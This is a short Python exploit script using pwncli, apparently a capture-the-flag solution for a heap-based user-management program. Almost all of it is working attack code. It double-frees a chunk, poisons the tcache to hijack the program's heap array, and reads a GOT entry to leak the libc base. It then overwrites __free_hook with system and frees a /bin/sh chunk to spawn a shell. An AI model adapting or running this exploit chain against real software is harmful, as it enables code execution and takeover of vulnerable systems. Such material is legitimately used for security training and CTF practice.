#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def create_user(name, age:int):
    p.sendlineafter("Your choice: ", "1")
    p.sendafter("name:", name)
    p.sendlineafter("age:", str(age))


def delete_user(idx:int):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("Index:", str(idx))


def edit_user(idx:int, name, age:int):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Index:", str(idx))
    p.sendafter("name:", name)
    p.sendlineafter("age:", str(age))


def display_user(idx:int):
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Index:", str(idx))
    msg = p.recvline_startswith("age:")
    info(f"get msg{msg}")
    return msg

"""
1. hijack heap_array
2. change ptr to leak
3. change __free_hook to system
4. free /bin/sh chunk
"""

create_user("aaa", 18)
delete_user(0)
delete_user(0)

create_user(p32(0x602060), 18)
create_user("a", 18)
create_user(p32(0x601F88), 0x601F88)
msg = display_user(1)
libc_base_addr = int(msg[5:].decode()) - libc.sym['write']
log_libc_base_addr(libc_base_addr)
libc.address = libc_base_addr

edit_user(2, p64(libc_base_addr+0x1b3e9a), libc.sym['__free_hook'])
edit_user(1, p64(libc.sym['system']), 0)

delete_user(0)

get_flag_when_get_shell(p)

p.interactive()